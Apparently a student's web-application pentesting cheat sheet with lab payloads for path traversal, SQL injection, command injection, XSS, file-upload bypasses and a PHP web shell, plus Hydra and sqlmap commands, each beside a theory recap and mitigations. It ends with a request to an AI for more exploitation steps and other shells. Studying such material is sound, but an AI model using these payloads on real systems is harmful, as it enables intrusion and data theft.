[https://gchq.github.io/CyberChef/

## Information Disclosure

Information disclosure occurs when sensitive data is unintentionally exposed to users or attackers. This might include error messages, source code, configuration files, internal comments, debug output, and more.
### Theory Recap

- Common sources:
    - `robots.txt`, `.git/`, `/backup/`, `/admin/`, etc.
    - Error messages (e.g., SQL errors, stack traces)
    - Directory listing enabled
    - Developer comments in HTML/JS
    - Backup files (`.bak`, `.old`, `~`, etc.)
- Impact: Leakage of API keys, DB info, internal logic — can lead to access control bypass, SQLi, RCE
- Mitigation: Sanitize error handling, disable directory listing, restrict debug mode, scrub HTML/JS comments before deploy
### Lab Focus / Payload Examples

- Enumerate:
    - Try `robots.txt`, `.git/config`, `sitemap.xml`, `/.env`
- Fuzz:
    - Send unexpected params: `?debug=true`, `?source=1`
- Errors:
    - Submit special characters (e.g., `'`, `--`, `%00`) to trigger verbose SQL or system errors
#### Tools

- **Burp Suite**: Intercept/fuzz requests
- **CyberChef**: Decode error output or hidden data (base64, JWT, hex)
- **curl**:

```bash
curl -I http://example.com/.git/config
curl http://example.com/backup/index.bak
```

---
### Path Traversal

#### ❓ What is it?

Allows reading arbitrary files by manipulating file paths (`../`) in user input to escape intended directories.

#### 🧠 Theory Recap

- Exploits how the backend builds file paths unsafely:
    ```php
    $file = $_GET['filename'];
    include("/var/www/images/" . $file);
    ```
    
- Useful targets: `/etc/passwd`, `/var/www/config.php`, log files
- Mitigation:
    - Whitelist files
    - Canonicalize paths (realpath)
    - Validate input strictly (no `..`, slashes)

#### 🧪 Payloads

- Simple: `?file=../../../../etc/passwd`
- Absolute: `?file=/etc/passwd`
- Bypasses:
    - URL encode: `..%2f`, `%252e%252e%252f`
    - Nested: `....//` → resolves to `../`
    - Null byte: `../../../etc/passwd%00.png`

#### 🔧 Tools

- **Burp Suite** (for request crafting and intercepting response)
    
---

### 3. Authentication Vulnerabilities

#### ❓ What is it?

Flaws in login, session, or reset flows that allow bypass or brute-force.

#### 🧠 Theory Recap
- Common issues:
    - Username enumeration via timing, responses
    - Weak/brute-forceable logins
    - Broken 2FA or password reset logic
    - Default credentials
- Mitigation:
    - Generic error messages
    - Rate limiting, CAPTCHA, lockouts
    - Strong session management
        
#### 🧪 Example Techniques

- Enumeration:
    - Time-based or message-based feedback
    - Script: loop usernames, observe response size/time
- Brute-force bypass:
    - Switch IP headers to bypass block
    - Try multiple creds in one request if possible

#### 🔧 Tools

- **Hydra** for brute-force:
    ```bash
    hydra -L users.txt -P passwords.txt 10.0.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
    ```
    
- Burp Intruder or Repeater for logic testing

---

### 4. SQL Injection (SQLi)

#### ❓ What is it?

Injection of SQL code via user input to manipulate backend queries.

#### 🧠 Theory Recap

- Types:
    - Union-based: `UNION SELECT ...`
    - Error-based: force errors to reveal data
    - Boolean: true/false logic to infer data
    - Time-based blind: use `SLEEP(5)` or similar
- Impacts: Auth bypass, data exfil, RCE (via SQL shell functions)

#### 🧪 Payloads from Notes

- String-based: `name=root' OR '1'='1`
- Comment filter bypass: `name=root'/**/OR/**/'1'='1`
- No space: `name=root'%09OR%09'1'='1`
- Numeric: `id=2 OR 1=1`
- ORDER BY for column guessing: `?id=1 ORDER BY 3`
- ORDER BY for age: `?id=2 OR 1=1 ORDER BY age`
- ORDER BY for age descending: `?id=2 OR 1=1 ORDER BY age DESC`
- Union: `?id=1 UNION SELECT NULL, username, password FROM users`
- Regex filter: use `%23` to parse `#` - SQL ignores 

#### 🔧 Tools

- **sqlmap** (when allowed)
    
    ```bash
    sqlmap -u "http://10.0.0.2/sqli/example1.php?id=1" --dbs
    ```
    
- Manual via Burp or browser URL
    
---

### 5. OS Command Injection

#### ❓ What is it?

Occurs when user input is used to construct shell commands without proper sanitization.

#### 🧠 Theory Recap

- Vectors: `system()`, `exec()`, `popen()`
- Payload chaining:
    - `127.0.0.1; cat /etc/passwd`
    - `| whoami`
    - `&& id`
        
- Bypasses: newline (`%0A`), null byte, encoded pipes
- Real-world use: ping, traceroute, disk check inputs

#### 🧪 Payloads from Notes

- Simple: `ip=127.0.0.1;cat /etc/passwd`
- PHP eval shell:
    ```php
    <?php system($_GET["cmd"]); ?>
    ```
    Access via: `upload/shell.php?cmd=whoami`

#### 🔧 Tools

- Burp Repeater to test chained commands    
- curl:
    ```bash
    curl 'http://10.0.0.2/commandexec/example1.php?ip=127.0.0.1|whoami'
    ```

---

### 6. Cross-Site Scripting (XSS)

#### ❓ What is it?

Injection of JavaScript into pages viewed by other users.

#### 🧠 Theory Recap

- Types:    
    - Reflected: immediate response (in URL)
    - Stored: persistent, stored in DB
    - DOM-based: JS reads malicious input
- Impacts: Session hijack, phishing, defacement

#### 🧪 Payloads from Notes

- Pop-up Script: `<script>alert('RC')</script>`
- Case bypass: `<scRIPT>alert('RC')</SCrIPT>`
- Double-injection: `<scr<script>ipt>alert('RC')</src<script>ipt>`
- No-script fallback: `<img src=x onerror=alert('RC')>`

#### 🔧 Tools

- Burp Suite (check rendered response)
- JS testing tools like `alert()`, `prompt()`, `confirm()`

---

### 7. Access Control Vulnerabilities

#### ❓ What is it?

Improper enforcement of user roles and permissions.

#### 🧠 Theory Recap

- Types:    
    - Vertical: normal → admin
    - Horizontal: user A accesses user B’s data
    - Insecure direct object references (IDOR)
- Mitigation:
    - Server-side checks
    - Don’t trust client input for access level
    - Use access control middleware consistently

#### 🧪 Examples

- Change `user_id=123` to another    
- Modify role in JSON body: `"role":"admin"`
- Predictable admin panel: `/admin` or `/superuser`

#### 🔧 Tools

- Burp Repeater/Intruder    
- Use session cookies of lower user to test privilege boundaries

---

### 8. File Upload Vulnerabilities

#### ❓ What is it?

Allows attackers to upload dangerous files, such as web shells, due to poor validation.

#### 🧠 Theory Recap

- Checkpoints to bypass:
    - Content-Type (MIME)        
    - Extension filters
    - File name/path validation
- Impacts: RCE, DoS (large file), overwrite existing files

#### 🧪 Shells from Notes

- Basic RCE Shell:
    ```php
    <?php system($_GET['cmd']); ?>
    ```
    
- Access: `shell.php?cmd=cat /etc/passwd` 
- Directory traversal via filename: `filename="../shell.php"`
- Extension bypass:
    - `.php3` 
    - `.php.jpg`
    - `shell.p.phphp`
    - `shell.php%00.jpg`
- MIME spoof:
    - Set `Content-Type: image/jpeg` and upload PHP file

#### 🔧 Tools

- Burp Suite: Modify filename/extension/content-type during upload
- `exiftool` (optional, for polyglots):

    ```bash
    exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
    ```
    
---

### 9. Business Logic Vulnerabilities

#### ❓ What is it?

Flaws in the design or flow of the application logic that allow unintended behaviors.

#### 🧠 Theory Recap

- Often not technical bugs — instead, logic mistakes:
    - Skipping steps in a workflow
    - Negative values in payment
    - Ordering zero items or decimal quantities
    - Race conditions during checkout or transfers
- Not easily detected by scanners

#### 🧪 Examples

- Apply voucher twice
- Checkout with `0` items
- Submit request for refund > paid amount
- Transfer money while editing form manually

#### 🔧 Tools

- Burp Suite for intercept/modifying workflows
- Manual testing and logic understanding crucial
---

## Reprompt

1. Business Logic Vulnerabilities doesn't tell me the steps I can use to exploit this on a web app.
2. XXS Payloads inefficient
3. File Upload Vulnerabilities - I need other shell]()